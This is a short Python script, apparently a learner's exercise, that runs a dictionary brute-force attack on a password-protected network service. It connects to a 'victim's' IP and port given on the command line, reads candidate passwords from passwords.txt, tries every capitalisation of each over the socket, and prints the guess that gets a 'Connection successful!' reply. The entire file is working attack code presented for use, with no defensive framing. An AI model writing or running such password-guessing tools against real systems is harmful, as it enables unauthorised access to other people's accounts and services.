import socket
import argparse
import itertools
import string


class Hacker:

    def __init__(self):
        self.socket = socket.socket()

    def connect(self, ip_address, sock):
        hostname = (ip_address, sock)
        self.socket.connect(hostname)

    def send_message(self, message):
        encoded_message = message.encode()
        self.socket.send(encoded_message)

    def receive_response(self):
        response = self.socket.recv(1024)
        response = response.decode()
        return response

    def close_connection(self):
        self.socket.close()

    def __del__(self):
        self.socket.close()


def password_list_generator():
    passwords = []
    with open("passwords.txt", 'r') as file:
        for line in file:
            passwords.append(line.rstrip())
    return passwords


def capitalizations(s):
    if s == '':
        yield ''
        return
    for rest in capitalizations(s[1:]):
        yield s[0].upper() + rest
        if s[0].upper() != s[0].lower():
            yield s[0].lower() + rest


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Let's hack them... Enter victim's IP_address and socket")
    parser.add_argument("ip_address")
    parser.add_argument("socket")

    args = parser.parse_args()

    if args.ip_address == "localhost":
        args.ip_address = "127.0.0.1"

    try:
        args.socket = int(args.socket)
    except ValueError:
        print("Socket must be integer value!")
        exit()

    hacky = Hacker()
    hacky.connect(args.ip_address, int(args.socket))

    for password in password_list_generator():
        for combination in capitalizations(password):
            try:
                hacky.send_message(combination)
                response = hacky.receive_response()
                if response == "Connection successful!":
                    print(combination)
                    break
            except ConnectionAbortedError:
                break
